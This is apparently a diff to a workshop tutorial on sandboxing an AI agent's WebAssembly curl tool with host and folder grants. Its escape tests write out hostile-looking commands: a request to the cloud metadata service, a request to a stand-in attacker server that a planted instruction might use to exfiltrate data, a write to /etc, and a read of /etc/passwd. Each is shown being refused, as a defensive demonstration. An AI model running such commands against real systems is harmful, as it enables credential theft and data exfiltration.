@@ -27,15 +27,20 @@ You need Rust 1.98.1 with the `wasm32-wasip2` target (`make doctor` checks).
 
 To make it yours, open `components/tool-curl/src/lib.rs` and change the
 message `"saved {} bytes to {path}\n"`, for example to
-`"saved {} bytes to {path} (built by me)\n"`. Then build and push:
+`"saved {} bytes to {path} (built by me)\n"`. Then build it, which writes
+`target/wasm32-wasip2/release/tool_curl.wasm`:
 
 ```sh
 make build
+```
+
+Push it as `tool-curl:mine`, a tag of its own:
+
+```sh
 make push-build
 ```
 
-`make build` writes `target/wasm32-wasip2/release/tool_curl.wasm`.
-`make push-build` pushes it as `tool-curl:mine`, a tag of its own. The
+The
 prebuilt tool keeps its tag, `tool-curl:0.4.0`, so later steps are not
 affected.
 
@@ -77,7 +82,7 @@ line basics Rust's standard library needs: stdout, environment, clocks.)
 Prebuilt:
 
 ```sh
-kubectl apply -f steps/02-curl/workload.yaml \
+kubectl apply -f steps/02-curl/workloaddeployment.yaml \
   && sleep 2 && kubectl wait --for=condition=Ready \
   workloaddeployment/toolbox-agent
 ```
@@ -85,12 +90,12 @@ kubectl apply -f steps/02-curl/workload.yaml \
 Your build:
 
 ```sh
-kubectl apply -f steps/02-curl/workload-mine.yaml \
+kubectl apply -f steps/02-curl/workloaddeployment-mine.yaml \
   && sleep 2 && kubectl wait --for=condition=Ready \
   workloaddeployment/toolbox-agent
 ```
 
-`workload-mine.yaml` is `workload.yaml` with one change: the `curl` image is
+`workloaddeployment-mine.yaml` is `workloaddeployment.yaml` with one change: the `curl` image is
 `tool-curl:mine`. Built again? Run `make push-build`, then
 `kubectl delete workloaddeployment toolbox-agent` and apply again, so the host
 fetches the new push.
@@ -101,7 +106,7 @@ in both manifests: one host, one folder.
 ```yaml
 - name: curl
   localResources:
-    allowedHosts: [api.workshop-sites.svc]
+    allowedHosts: [api.mock-sites.svc]
     volumeMounts: [{ name: curl-data, mountPath: /data }]
 ```
 
@@ -125,23 +130,39 @@ The messages are the tool's choice. What gets through is the host's.
 Type each prompt into the chat at http://agent.localhost:18180, or run the
 curl command under it.
 
-**1. Fetch the granted host:** `fetch http://api.workshop-sites.svc/data`
+**1. Fetch the granted host** 
+
+In the chat:
+
+```
+fetch http://api.mock-sites.svc/data
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'fetch http://api.workshop-sites.svc/data'
+  -d 'fetch http://api.mock-sites.svc/data'
 ```
 
 The prompt that got "isn't installed yet" in step 1. The host is in curl's
-`allowedHosts`, so the toy site answers.
+`allowedHosts`, so the mock API answers.
 
-**2. Save a page into the tool's folder:** `save http://api.workshop-sites.svc/data to page.html`
+**2. Save a page into the tool's folder** 
+
+In the chat:
+
+```
+save http://api.mock-sites.svc/data to page.html
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'save http://api.workshop-sites.svc/data to page.html'
+  -d 'save http://api.mock-sites.svc/data to page.html'
 ```
 
 The model turns this into `curl -o page.html`. The prebuilt curl answers
@@ -151,7 +172,15 @@ so the write succeeds: the folder is the boundary, not a blanket ban.
 
 ## Now try each escape
 
-**3. The metadata service is refused:** `curl -s http://169.254.169.254/latest/meta-data/`
+**3. The metadata service is refused** 
+
+In the chat:
+
+```
+curl -s http://169.254.169.254/latest/meta-data/
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
@@ -161,38 +190,73 @@ curl -s -H 'Host: agent.localhost' \
 
 On most clouds this address hands out credentials. The host refuses it before anything leaves.
 
-**4. Other cluster hosts are refused:** `curl -s http://collector.workshop-sites.svc/collect`
+**4. An attacker's server is refused** 
 
-```sh
-curl -s -H 'Host: agent.localhost' \
-  http://127.0.0.1:18180/ \
-  -d 'curl -s http://collector.workshop-sites.svc/collect'
+In the chat:
+
+```
+curl -s http://attacker.mock-sites.svc/collect
 ```
 
-The collector stands in for an attacker's server. It is on the network, but not in curl's grant, so the host refuses it.
-
-**5. A redirect can't sneak past:** `curl -sL http://api.workshop-sites.svc/redirect`
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'curl -sL http://api.workshop-sites.svc/redirect'
+  -d 'curl -s http://attacker.mock-sites.svc/collect'
 ```
 
-The granted host redirects to the collector. The host checks every hop, including the one you didn't type, and refuses the second.
+`attacker.mock-sites.svc` plays the server of someone who has hijacked the
+agent, the address a planted instruction would tell it to send data to. It is
+on the network and would answer, but it isn't in curl's grant, so the host
+refuses the request before it leaves.
 
-**6. Writing outside /data fails:** `curl -o /etc/evil -s http://api.workshop-sites.svc/data`
+**5. A redirect can't sneak past** 
+
+In the chat:
+
+```
+curl -sL http://api.mock-sites.svc/redirect
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
   http://127.0.0.1:18180/ \
-  -d 'curl -o /etc/evil -s http://api.workshop-sites.svc/data'
+  -d 'curl -sL http://api.mock-sites.svc/redirect'
+```
+
+The granted host redirects to the attacker's server. The host checks every hop, including the one you didn't type, and refuses the second.
+
+**6. Writing outside /data fails** 
+
+In the chat:
+
+```
+curl -o /etc/evil -s http://api.mock-sites.svc/data
+```
+
+In your terminal or Codespaces:
+
+```sh
+curl -s -H 'Host: agent.localhost' \
+  http://127.0.0.1:18180/ \
+  -d 'curl -o /etc/evil -s http://api.mock-sites.svc/data'
 ```
 
 This curl sees one folder, so `/etc` doesn't exist for it. The filesystem
 says "No such file or directory"; the tool calls that `access-denied`.
 
-**7. Reading a file:// URL outside /data fails:** `curl -s file:///etc/passwd`
+**7. Reading a file:// URL outside /data fails** 
+
+In the chat:
+
+```
+curl -s file:///etc/passwd
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
@@ -203,7 +267,15 @@ curl -s -H 'Host: agent.localhost' \
 Native curl reads any file your user can. This curl reads `file://` URLs
 through the same one folder, so `/etc/passwd` doesn't exist for it.
 
-**8. Reading a file:// URL inside /data works:** `curl -s file:///data/page.html`
+**8. Reading a file:// URL inside /data works** 
+
+In the chat:
+
+```
+curl -s file:///data/page.html
+```
+
+In your terminal or Codespaces:
 
 ```sh
 curl -s -H 'Host: agent.localhost' \
@@ -216,7 +288,7 @@ the filesystem it is given holds only that one folder.
 
 **For hosts, the grant is what stops it.** `make prove` also runs a control
 with `allowedHosts` widened to `*` (`control-wide-open.yaml`), and the same
-request to the collector then goes through (`control-checks.txt`). The tool
+request to the attacker's server then goes through (`control-checks.txt`). The tool
 didn't change; only its grant did.
 
 The later steps use the prebuilt curl. To keep your own build, change the
